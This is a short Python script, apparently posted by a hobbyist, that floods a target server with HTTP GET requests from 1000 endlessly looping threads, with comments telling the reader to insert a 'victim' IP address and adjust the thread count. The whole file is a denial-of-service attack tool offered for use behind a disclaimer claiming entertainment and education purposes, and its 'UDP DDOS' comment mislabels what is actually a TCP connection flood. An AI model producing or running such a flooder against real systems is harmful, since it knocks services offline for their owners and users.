import socket
import threading

print('I will not be responsible for any of your actions, i made this DDOS for entertainment and education purpose, i don't wanna harm anyone using this script')
print('MADE BY PHANTOM')
print('DISCORD - theoldphantom')

# REPLACE VICTIM IP ADDRESS WITH YOUR VICTIM IP AND YOU CAN CHANGE THE AMMOUNT TOO OF THREADS

# DON'T SKID

# IT'S A UDP DDOS

attack_num = 0

def attack():
    global attack_num
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('Victim Ip address', 8080))
        s.send(b'GET / HTTP/1.1\r\nHOST: victime ip\r\n\r\n')
        resp = s.recv(4096)

        attack_num += 1
        print('ATTACK NUMBER:', attack_num)
        s.close()


for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()